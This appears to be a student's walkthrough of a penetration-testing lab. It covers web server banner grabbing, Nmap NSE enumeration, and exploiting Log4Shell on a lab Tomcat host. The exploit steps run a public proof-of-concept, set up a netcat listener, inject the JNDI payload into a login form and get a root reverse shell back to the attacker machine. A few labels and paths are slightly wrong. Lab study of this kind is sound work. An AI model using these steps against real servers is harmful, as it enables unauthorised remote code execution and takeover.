Task 1: Footprint a Web Server using Netcat and Telnet

Netcat
Netcat is a networking utility that reads and writes data across network connections, using the TCP/IP protocol. It is a reliable “back-end” tool used directly or driven by other programs and scripts. It is also a network debugging and exploration tool.

Telnet

Telnet is a client-server network protocol. It is widely used on the Internet or LANs. It provides the login session for a user on the Internet.

The primary security problems with Telnet are the following:

▪ It does not encrypt any data sent through the connection.

▪ It lacks an authentication scheme.

Telnet helps users perform banner-grabbing attacks. It probes HTTP servers to determine the Server field in the HTTP response header


In Parrot security machine:

  1. nc -vv www.moviescope.com 80
  1. GET / HTTP/1.0 → Enter x2

and/or

  1. telnet www.moviescope.com 80
  1. GET / HTTP/1.0 → Enter x2

Task 2: Enumerate Web Server Information using Nmap Scripting Engine (NSE)

Utilizing Nmap and http-enum.nse content returns a diagram of those applications, registries, and records uncovered. This way, it is possible to check for vulnerabilities or abuses in databases.

  1. Enumerate directories used by web servers/applications:
    1. nmap -sV --script=http-enum <target website>
  1. Discover the hostnames that resolve the targeted domain.
    1. nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap-www.goodshopping.com
  1. Perform HTTP trace on targeted domain (This script will detect a vulnerable server that uses the TRACE method by sending an HTTP TRACE request that shows if the method is enabled or not)
    1. nmap --script http-trace -d www.goodshopping.com
  1. Check whether Web Application Firewall is configured on the target host or domain
    1. nmap -p80 --script http-waf-detect www.goodshopping.com

Task 2: Gain Access to Target Web Server by Exploiting Log4j Vulnerability

Log4j is an open-source framework that helps developers store various types of logs produced by users.

Log4j which is also known as Log4shell and LogJam is a zero-day RCE (Remote Code Execution) vulnerability, tracked under CVE-2021–44228.

  • Enables insecure JNDI lookups, when these JNDI lookups are paired with the LDAP protocol, can be exploited to exfiltrate data or execute arbitrary code.

  1. Scan target machine to identify vulnerable services running
    1. nmap -sV -sC 10.10.1.9
    1. Note: -sV option enables version detection. This means Nmap will try to determine the version of the services running on open ports. -sC option enables the use of default scripts in the Nmap Scripting Engine (NSE). These scripts perform various tasks like service detection, vulnerability detection, and more.
  1. Results show port 8080 open and Apache Tomcat/Coyote 1.1 server running on target system
  1. Upon investigation we can see that Apache is vulnerable to Remote Code Execution (RCE) attack. Now we wil use searchsploit to find the vulnerabilities pertaining to RCE attack on the target server
  1. View RCE vulnerabilities on Apache server
    1. searchsploit -t Apache RCE
  1. Now, we need to select a vulnerability to exploit the Server from the list, from the Nmap scan we found that the Apache Tomcat server is running on JSP so we will target java vulnerabilities from the list of vulnerabilities.
  1. We can see that Java platform is vulnerable for Apache Log4j 2 - Remote Command Execution (RCE) exploit
  1. Exploit the Log4j vulnerability
    1. Open Firefox
    1. http://<target IP:8080>
    1. Switch to terminal → cd log4j-shell-poc/
    1. Install JDK 8 (extract JDK zip file located at /home/attacker)
      1. Open new terminal window
      1. tar -xf jdk-8u202-linux-x64.tar.gz
    1. Move file to /user/bin
      1. mv jdk1.8.0_202 /usr/bin/
    1. Update the installed JDK path in the poc.py file
      1. Switch to previous terminal window
      1. pluma poc.py
      1. Replace line 62, 87, and 99 with /usr/bin/jdk1.8.0_202/bin/javac
      1. Replace line 87 and99 with /usr/bin/jdk1.8.0_202/bin/java.
      1. New terminal window → nc -lvp 9001 to create netcat listener
      1. Switch to terminal window at path /log4j-shell-poc
        1. python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
        1. Copy the payload generate in the send me section
        1. Paste payload into Username field in Firefox browser (can enter any password in password field)
      1. Switch to netcat listener - can see reverse shell is opened
        1. Type pwd to view working directory
        1. Type whoami - should have root access
